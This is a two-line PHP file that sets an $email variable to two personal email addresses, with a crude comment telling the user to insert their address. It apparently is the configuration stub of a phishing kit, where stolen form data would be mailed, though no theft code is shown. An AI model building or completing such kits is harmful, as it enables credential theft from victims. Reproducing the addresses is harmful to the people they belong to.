<?php

$email = "roseduke96@gmail.com, chopdodo@aol.com"; // PUT UR FUCKING E-MAIL BRO

?>